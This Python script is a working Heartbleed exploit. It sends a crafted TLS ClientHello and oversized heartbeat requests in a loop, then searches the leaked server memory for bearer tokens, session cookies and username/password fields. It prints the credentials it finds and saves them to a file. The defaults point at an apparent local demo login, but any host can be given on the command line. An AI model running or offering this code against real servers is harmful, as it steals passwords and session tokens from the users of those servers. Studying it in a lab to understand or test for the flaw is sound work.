#!/usr/bin/python
import sys
import os
import socket
import struct
import time
import select

def h2bin(x):
    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))

# Minimal TLS 1.0 ClientHello (57 bytes) with a single cipher suite and the
# Heartbeat extension. Keeping it tiny is important: the Heartbleed over-read
# starts just after this ClientHello inside the reused SSL read buffer, so a
# short ClientHello leaves more of the previous request (login body / cookies)
# intact to be leaked.
hello = h2bin('''
16 03 01 00 34 01 00 00 30 03 01
00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f
10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f
00 00 02 00 2f 01 00 00 05 00 0f 00 01 01
''')

hb = h2bin('''
18 03 01 00 03
01 40 00
''')

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        if endtime - time.time() < 0:
            return None
        r, _, _ = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None
    return typ, ver, pay

def _is_printable(ch):
    o = ord(ch)
    return 32 <= o < 127 or ch in '\r\n\t'

def find_interesting(text):
    markers = [
        'Authorization: Bearer',
        'Bearer eyJ',
        'JSESSIONID=',
        'Cookie:',
        '"username"',
        '"password"',
        'username=',
        'password=',
    ]
    hits = [text.find(m) for m in markers if text.find(m) != -1]
    if not hits:
        return None
    idx = min(hits)

    # Expand to the contiguous readable (printable) region around the marker,
    # so the raw binary heap noise is dropped instead of dumped to the screen.
    lo = idx
    hi = idx
    while lo > 0 and _is_printable(text[lo - 1]):
        lo -= 1
    while hi < len(text) and _is_printable(text[hi]):
        hi += 1
    raw = text[lo:hi]

    # Keep only fully-printable, non-empty lines (the decrypted HTTP request).
    lines = []
    for line in raw.replace('\r\n', '\n').replace('\r', '\n').split('\n'):
        s = line.strip()
        if s and all(32 <= ord(c) < 127 or c == '\t' for c in s):
            lines.append(s)
    return '\n'.join(lines)

def main():
    host = '127.0.0.1'
    port = 8082

    if len(sys.argv) >= 2:
        host = sys.argv[1]
    if len(sys.argv) >= 3:
        port = int(sys.argv[2])

    print(f'[*] Starting heartbleed loop against {host}:{port}')
    print('[*] Open http://localhost/cve-heartbleed/ and login with demo / demo123')
    print('[*] Keep this script running while submitting the login form.')
    print('[*] Press Ctrl+C to stop\n')

    found_count = 0
    seen = set()
    for attempt in range(100000):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            s.send(hello)

            while True:
                typ, ver, pay = recvmsg(s)
                if typ is None:
                    break
                if typ == 22 and pay and pay[0] == 0x0E:
                    break

            s.send(hb)
            typ, ver, pay = recvmsg(s)

            if typ == 24 and pay:
                text = pay.decode('latin-1', errors='ignore')
                snippet = find_interesting(text)
                if snippet:
                    found_count += 1
                    if snippet not in seen:
                        seen.add(snippet)
                        print(f'\n{"=" * 60}')
                        print(f'[+] FOUND #{len(seen)} (attempt {attempt}):')
                        print(f'{"=" * 60}')
                        print(snippet)
                        print(f'{"=" * 60}\n')
                        out_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'leaked_creds.txt')
                        with open(out_file, 'a', encoding='utf-8', errors='ignore') as f:
                            f.write(f'=== ATTEMPT {attempt} ===\n{snippet}\n\n')
                else:
                    sys.stdout.write(f'\r[{attempt}] {len(pay)} bytes leaked, no creds yet...')
                    sys.stdout.flush()

            s.close()
            time.sleep(0.02)

        except KeyboardInterrupt:
            print('\n[*] Stopped by user')
            break
        except Exception:
            time.sleep(0.2)

    print(f'\n[*] Done. Found {found_count} leaks.')

if __name__ == '__main__':
    main()
